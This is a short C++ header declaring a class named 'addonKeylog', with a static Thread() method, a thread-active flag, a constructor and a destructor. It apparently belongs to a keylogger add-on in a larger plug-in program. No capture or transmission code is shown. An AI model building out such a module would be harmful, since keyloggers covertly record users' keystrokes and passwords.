#pragma once

#include "addon.h"





class addonKeylog
{

public:

	static void Thread();
	bool threadActive;

	addonKeylog();
	~addonKeylog();
};